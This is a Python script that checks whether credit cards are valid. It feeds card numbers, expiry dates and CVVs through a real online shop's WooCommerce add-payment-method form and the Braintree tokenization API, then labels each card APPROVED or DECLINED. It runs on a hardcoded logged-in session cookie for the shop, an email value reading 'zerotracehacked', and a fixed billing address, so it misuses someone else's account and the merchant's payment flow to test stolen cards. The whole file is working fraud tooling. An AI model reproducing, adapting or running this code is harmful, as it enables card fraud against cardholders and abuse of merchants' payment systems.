import base64
import httpx
import time
import json
import uuid
import re
from html import unescape
from bs4 import BeautifulSoup

def process_card_b3(cc):
    """
    Process credit card through Braintree Auth gateway
    Returns: dict with status, response, and gateway
    """
    try:
        # Parse the card details
        parts = cc.split("|")
        if len(parts) < 4:
            return {
                "status": "ERROR",
                "response": "Invalid format. Use: CC|MM|YY|CVV",
                "gateway": "Braintree Auth"
            }
        
        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        # Format year if needed
        if len(yy) == 4:
            yy = yy[-2:]
        
        # Validate expiry date
        def validate_expiry_date(mes, ano):
            mes = mes.zfill(2)
            try:
                expiry_month = int(mes)
                expiry_year = int(ano)
            except ValueError:
                return False, "Invalid expiry date"

            current_year = int(time.strftime("%y"))
            current_month = int(time.strftime("%m"))

            if expiry_month < 1 or expiry_month > 12:
                return False, "Expiration Month Invalid"
            if expiry_year < current_year:
                return False, "Expiration Year Invalid"
            if expiry_year == current_year and expiry_month < current_month:
                return False, "Expiration Month Invalid"

            return True, ""

        valid, err = validate_expiry_date(mm, yy)
        if not valid:
            return {
                "status": "DECLINED",
                "response": err,
                "gateway": "Braintree Auth"
            }

        async def create_payment_method():
            cookies = {
                'mailchimp_landing_site': 'https%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F',
                'sbjs_migrations': '1418474375998%3D1',
                'sbjs_current_add': 'fd%3D2025-08-28%2010%3A25%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
                'sbjs_first_add': 'fd%3D2025-08-28%2010%3A25%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
                'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
                'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
                '_gcl_au': '1.1.403858930.1756376751',
                '_ga': 'GA1.1.1790710832.1756376751',
                'mailchimp.cart.current_email': 'zerotracehacked@gmail.com',
                'mailchimp_user_previous_email': 'zerotracehacked%40gmail.com',
                'mailchimp_user_email': 'zerotracehacked%40gmail.com',
                'mailchimp.cart.previous_email': 'zerotracehacked@gmail.com',
                'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
                'Subscribe': 'true',
                'wordpress_test_cookie': 'WP%20Cookie%20check',
                'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
                'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'senryjo%7C1756732808%7CJlOnLs1dpeUnYwAlBTeimvDEGA8k9rxesoUfzzzLH8l%7C48a4443b2bbb610a2f1c5c058ee733932c812495edef18319d0cf339a726fe27',
                'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '8966%7Cother%7Cread%7Ced75eba67e9a383a1c5d83eba9186b7f7bb7d7ba478504b285a6c8c447fa416b',
                '_ga_D1Q49TMJ2C': 'GS2.1.s1756558933$o2$g1$t1756560041$j29$l0$h0',
                'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
            }

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'priority': 'u=0, i',
                'referer': 'https://apluscollectibles.com/my-account/payment-methods/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }

            async with httpx.AsyncClient(timeout=30) as session:
                # Get the add payment method page
                response = await session.get(
                    'https://apluscollectibles.com/my-account/add-payment-method/',
                    cookies=cookies,
                    headers=headers
                )

                # Extract nonce
                nonce_match = re.search(
                    r'<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
                    response.text
                )
                if not nonce_match:
                    return "Failed to extract nonce"

                nonce = nonce_match.group(1)

                # Extract Braintree token
                token_match = re.search(r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]', response.text)
                if not token_match:
                    return "Failed to extract Braintree token"

                token_base64 = token_match.group(1)
                try:
                    decoded_json = base64.b64decode(token_base64).decode('utf-8')
                    token_data = json.loads(decoded_json)
                    authorization_fingerprint = token_data.get('authorizationFingerprint')
                except Exception:
                    return "Failed to decode Braintree token"

                # Create payment method with Braintree
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': f'Bearer {authorization_fingerprint}',
                    'braintree-version': '2018-05-10',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'priority': 'u=1, i',
                    'referer': 'https://assets.braintreegateway.com/',
                    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Linux"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                }

                json_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': str(uuid.uuid4()),
                    },
                    'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                                    tokenizeCreditCard(input: $input) {
                                        token
                                        creditCard {
                                            bin
                                            brandCode
                                            last4
                                            cardholderName
                                            expirationMonth
                                            expirationYear
                                        }
                                    }
                                }''',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': cc_num,
                                'expirationMonth': mm,
                                'expirationYear': yy,
                                'cvv': cvv,
                                'billingAddress': {
                                    'postalCode': '10038',
                                    'streetAddress': '156 William Street',
                                },
                            },
                            'options': {
                                'validate': False,
                            },
                        },
                    },
                    'operationName': 'TokenizeCreditCard',
                }

                response = await session.post(
                    'https://payments.braintree-api.com/graphql',
                    headers=headers,
                    json=json_data,
                    timeout=30
                )

                token_match = re.search(r'"token":"([^"]+)"', response.text)
                if not token_match:
                    return "Failed to extract payment token"

                token = token_match.group(1)

                # Submit payment method
                cookies_update = cookies.copy()
                cookies_update['sbjs_session'] = 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F'

                headers_update = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://apluscollectibles.com',
                    'priority': 'u=0, i',
                    'referer': 'https://apluscollectibles.com/my-account/add-payment-method/',
                    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Linux"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                }

                data = {
                    'payment_method': 'braintree_cc',
                    'braintree_cc_nonce_key': token,
                    'braintree_cc_device_data': '{"correlation_id":"' + str(uuid.uuid4()) + '"}',
                    'braintree_cc_3ds_nonce_key': '',
                    'woocommerce-add-payment-method-nonce': nonce,
                    '_wp_http_referer': '/my-account/add-payment-method/',
                    'woocommerce_add_payment_method': '1',
                }

                response = await session.post(
                    'https://apluscollectibles.com/my-account/add-payment-method/',
                    cookies=cookies_update,
                    headers=headers_update,
                    data=data,
                    timeout=30
                )

                return response.text

        # Run the async function
        import asyncio
        result = asyncio.run(create_payment_method())

        # Parse the response
        error_message = ""
        try:
            json_resp = json.loads(result)
            if "error" in json_resp and "message" in json_resp["error"]:
                raw_html = unescape(json_resp["error"]["message"])
                soup = BeautifulSoup(raw_html, "html.parser")
                div = soup.find("div", class_="message-container")
                if div:
                    error_message = div.get_text(separator=" ", strip=True)
        except:
            try:
                soup = BeautifulSoup(unescape(result), "html.parser")
                ul = soup.find("ul", class_="woocommerce-error")
                if ul:
                    li = ul.find("li")
                    if li:
                        error_message = li.get_text(separator=" ", strip=True)
                else:
                    div = soup.find("div", class_="message-container")
                    if div:
                        error_message = div.get_text(separator=" ", strip=True)
            except:
                error_message = ""

        if "Reason: " in error_message:
            before, sep, after = error_message.partition("Reason: ")
            error_message = after.strip()

        if "Payment method successfully added." in result or "success" in result.lower():
            return {
                "status": "APPROVED",
                "response": "Payment Approved",
                "gateway": "Braintree Auth"
            }
        elif error_message:
            return {
                "status": "DECLINED",
                "response": error_message[:120],
                "gateway": "Braintree Auth"
            }
        else:
            return {
                "status": "DECLINED",
                "response": "Payment Declined",
                "gateway": "Braintree Auth"
            }

    except Exception as e:
        return {
            "status": "ERROR",
            "response": f"Processing Error: {str(e)}",
            "gateway": "Braintree Auth"
        }

    print(result)
